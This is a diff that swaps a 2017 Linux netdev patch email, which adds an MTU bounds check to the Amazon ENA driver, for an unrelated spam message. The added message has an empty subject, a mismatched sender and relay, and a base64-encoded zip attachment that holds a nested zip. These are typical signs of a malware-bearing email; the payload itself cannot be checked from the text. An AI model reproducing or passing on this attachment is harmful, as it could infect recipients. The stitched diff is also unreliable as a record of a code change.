@@ -1,57 +1,74 @@
-From: <netanel@amazon.com>
-Subject: [PATCH net-next 10/13] net: ena: add mtu limitation in ena_change_mtu()
-Date: Fri, 9 Jun 2017 01:01:22 +0300
-Message-ID: <1496959285-8632-11-git-send-email-netanel@amazon.com>
-References: <1496959285-8632-8-git-send-email-netanel@amazon.com>
+From: <bcohen@childrensnational.org>
+Subject: (unknown)
+Date: Thu, 08 Jun 2017 22:14:51 -0000
+Message-ID: <149696009192.29697.5075851396804670659@ttknet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain
-Cc: Netanel Belgazal <netanel@amazon.com>, <dwmw@amazon.com>,
-        <zorik@amazon.com>, <matua@amazon.com>, <saeedb@amazon.com>,
-        <msw@amazon.com>, <aliguori@amazon.com>, <nafea@amazon.com>,
-        <evgenys@amazon.com>
-To: <davem@davemloft.net>, <netdev@vger.kernel.org>
+Content-Type: application/zip; name="64017075.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from smtp-fw-9101.amazon.com ([207.171.184.25]:2640 "EHLO
-        smtp-fw-9101.amazon.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751881AbdFHWCw (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Thu, 8 Jun 2017 18:02:52 -0400
-In-Reply-To: <1496959285-8632-8-git-send-email-netanel@amazon.com>
+Received: from 56.34.access.ttknet.ru ([31.163.34.56]:56193 "HELO ttknet.ru"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751827AbdFHWO5 (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Thu, 8 Jun 2017 18:14:57 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-From: Netanel Belgazal <netanel@amazon.com>
-
-Signed-off-by: Netanel Belgazal <netanel@amazon.com>
----
- drivers/net/ethernet/amazon/ena/ena_netdev.c | 9 +++++++--
- 1 file changed, 7 insertions(+), 2 deletions(-)
-
-diff --git a/drivers/net/ethernet/amazon/ena/ena_netdev.c b/drivers/net/ethernet/amazon/ena/ena_netdev.c
-index 7dee448..7f31f4c 100644
---- a/drivers/net/ethernet/amazon/ena/ena_netdev.c
-+++ b/drivers/net/ethernet/amazon/ena/ena_netdev.c
-@@ -108,6 +108,13 @@ static int ena_change_mtu(struct net_device *dev, int new_mtu)
- 	struct ena_adapter *adapter = netdev_priv(dev);
- 	int ret;
- 
-+	if ((new_mtu > adapter->max_mtu) || (new_mtu < ENA_MIN_MTU)) {
-+		netif_err(adapter, drv, dev,
-+			  "Invalid MTU setting. new_mtu: %d max mtu: %d min mtu: %d\n",
-+			  new_mtu, adapter->max_mtu, ENA_MIN_MTU);
-+		return -EINVAL;
-+	}
-+
- 	ret = ena_com_set_dev_mtu(adapter->ena_dev, new_mtu);
- 	if (!ret) {
- 		netif_dbg(adapter, drv, dev, "set MTU to %d\n", new_mtu);
-@@ -3008,8 +3015,6 @@ static void ena_set_conf_feat_params(struct ena_adapter *adapter,
- 	ena_set_dev_offloads(feat, netdev);
- 
- 	adapter->max_mtu = feat->dev_attr.max_mtu;
--	netdev->max_mtu = adapter->max_mtu;
--	netdev->min_mtu = ENA_MIN_MTU;
- }
- 
- static int ena_rss_init_default(struct ena_adapter *adapter)
--- 
-2.7.4
+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
+AAEATwAAAOcLAAAAAA==
